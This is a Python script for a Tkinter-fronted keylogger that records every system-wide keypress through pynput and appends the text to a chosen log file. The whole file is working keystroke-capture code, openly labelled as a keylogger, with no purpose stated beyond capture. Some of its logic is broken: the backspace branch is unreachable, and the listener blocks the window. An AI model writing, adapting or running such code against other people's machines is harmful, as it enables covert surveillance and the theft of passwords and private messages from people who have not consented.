import tkinter as tk
from tkinter import filedialog
from pynput.keyboard import Listener, Key
import datetime

# Set the maximum number of characters per line
max_characters_per_line = 50
current_line_length = 0
current_line = []
log_file_path = None

# Define a list of keys to exclude from recording
excluded_keys = [
    Key.shift,
    Key.backspace,
    Key.caps_lock,
    Key.tab,
    Key.esc,
    Key.alt_l,
    Key.scroll_lock,
    Key.pause,
    Key.print_screen,
]

def generate_log_file_name():
    now = datetime.datetime.now()
    date_str = now.strftime("%Y-%m-%d_%H-%M-%S")
    return f"log_{date_str}.txt"

def write_to_file(key):
    global current_line_length, current_line

    letter = str(key)
    letter = letter.replace("'", "")

    if key in excluded_keys:
        return

    if letter == 'Key.space':
        letter = ' '
    if letter == "Key.enter":
        letter = "\n"

    if key == Key.backspace:
        if current_line:
            current_line.pop()
            current_line_length -= 1
            with open(log_file_path, 'a') as f:
                f.seek(0, 2)
                f.seek(f.tell() - 1, 0)
                f.truncate()

    if current_line_length >= max_characters_per_line:
        with open(log_file_path, 'a') as f:
            f.write('\n')
        current_line_length = 0
        current_line = []

    current_line.append(letter)
    current_line_length += 1

    with open(log_file_path, 'a') as f:
        f.write(letter)

def browse_file_path_and_start_logging():
    global log_file_path
    log_file_path = filedialog.asksaveasfilename(defaultextension=".txt")
    log_file_path_entry.delete(0, tk.END)
    log_file_path_entry.insert(0, log_file_path)
    
    # Start collecting events after file selection
    with Listener(on_press=write_to_file) as l:
        l.join()

# Create the main window
window = tk.Tk()
window.title("Keylogger | Created by Denis Dimov")

# Set window size and make it non-resizable
window.geometry("400x150")
window.resizable(False, False)

# Create and pack widgets
log_file_path_label = tk.Label(window, text="Log File Path:")
log_file_path_label.pack()

log_file_path_entry = tk.Entry(window)
log_file_path_entry.pack()

browse_button = tk.Button(window, text="Browse and Start Logging", command=browse_file_path_and_start_logging)
browse_button.pack()

window.mainloop()
